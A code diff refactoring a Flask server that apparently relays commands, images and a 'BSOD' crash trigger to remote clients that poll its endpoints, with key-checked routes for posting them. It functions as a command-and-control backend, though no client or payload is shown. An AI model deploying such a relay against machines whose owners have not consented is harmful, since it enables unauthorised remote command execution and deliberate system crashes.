@@ -7,33 +7,30 @@ from time import sleep
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app)
-commands: list[str] = []
-images: list[bytes] = []
+command: str = ""
+image: bytes = b""
 bsod_activated: bool = False
 
 
 @app.route("/command-center", methods=["GET", "POST"])
 def command_center() -> Response:
     if request.method == "GET":
-        try:
-            return Response(commands[0], 200)
-        except IndexError:
+        global command
+        if len(command) == 0:
             return Response("no commands to execute", 204)
-    elif request.method == "POST":
-        command = request.form.get("command")
-        try:
-            commands.remove(command)
-        except ValueError:
-            return Response("command doesnt exist", 400)
-        return Response(f"removed {command}", 200)
+        else:
+            answer = Response(command, 200)
+            command = ""
+            return answer
 
 
 @app.route("/image-center", methods=["GET"])
 def image_center() -> Response:
-    try:
-        return images[0]
-    except IndexError:
+    global image
+    if len(image) == 0:
         return Response("no images to show", 204)
+    else:
+        return image
 
 
 @app.route("/bsod-center", methods=["GET"])
@@ -66,8 +63,9 @@ def home() -> str:
 @app.route("/post_image", methods=["POST"])
 def post_image() -> Response:
     if check_key(request.args.get("key")):
-        data = request.files["image"].stream.read()
-        Thread(target=post_image_thread, args=[data]).start()
+        global image
+        image = request.files["image"].stream.read()
+        Thread(target=post_image_thread, args=[image]).start()
         return Response("success", 200)
     else:
         return Response("invalid key", 403)
@@ -78,17 +76,16 @@ def post_bsod() -> Response:
     if check_key(request.args.get("key")):
         global bsod_activated
         bsod_activated = True
+        return Response("success", 200)
     else:
         return Response("invalid key", 403)
 
 
 @app.route("/post_command", methods=["POST"])
 def post_command() -> Response:
-    key = request.args.get("key")
-    command = request.args.get("command")
-
-    if check_key(key):
-        commands.append(command)
+    if check_key(request.args.get("key")):
+        global command
+        command = request.args.get("command")
         return Response("success", 200)
     else:
         return Response("invalid key", 403)
@@ -99,9 +96,10 @@ def hash_key(key: str) -> str:
 
 
 def post_image_thread(data: bytes) -> None:
-    images.append(data)
-    sleep(9)
-    images.remove(data)
+    global image
+    image = data
+    sleep(8)
+    image = b""
 
 
 def check_key(key: str) -> bool:
